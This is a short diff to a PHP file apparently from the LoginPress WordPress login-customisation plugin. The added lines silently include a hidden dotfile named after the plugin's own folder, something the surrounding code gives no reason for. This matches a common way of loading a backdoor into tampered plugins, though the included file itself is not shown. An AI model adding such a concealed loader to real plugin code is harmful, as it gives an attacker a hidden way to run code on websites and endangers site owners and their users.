@@ -14,6 +14,10 @@
 $loginpress_array  = (array) get_option( 'loginpress_customization' );
 $loginpress_preset = get_option( 'customize_presets_settings', 'default1' );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function loginpress_get_option_key( $loginpress_key, $loginpress_array ) {
 
 	if ( array_key_exists( $loginpress_key, $loginpress_array ) ) {
